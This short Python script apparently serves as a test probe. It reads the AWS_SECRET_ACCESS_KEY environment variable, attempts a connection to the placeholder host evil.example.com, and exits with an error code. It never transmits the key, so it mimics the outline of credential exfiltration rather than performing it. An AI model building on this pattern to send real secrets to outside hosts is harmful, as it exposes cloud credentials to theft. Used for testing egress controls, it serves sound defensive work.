import os, socket
os.environ.get("AWS_SECRET_ACCESS_KEY")
try:
    socket.create_connection(("evil.example.com", 443), timeout=3)
except Exception:
    pass
raise SystemExit(1)
